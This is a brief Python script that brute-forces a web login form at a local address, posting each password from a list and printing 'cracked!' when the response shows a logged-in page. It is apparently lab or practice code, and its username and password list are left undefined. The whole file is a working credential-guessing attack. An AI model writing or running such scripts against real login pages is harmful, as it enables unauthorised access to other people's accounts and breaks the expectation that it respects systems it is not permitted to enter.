#!/usr/bin/env python3

import requests

URL = 'http://127.0.1.1:5000/user/login'


for password in passwords:
    response = requests.post(URL, data = {'username': username, 'password': password})
    if 'HOME' in response.text:
        print('cracked!', username, password)
        break

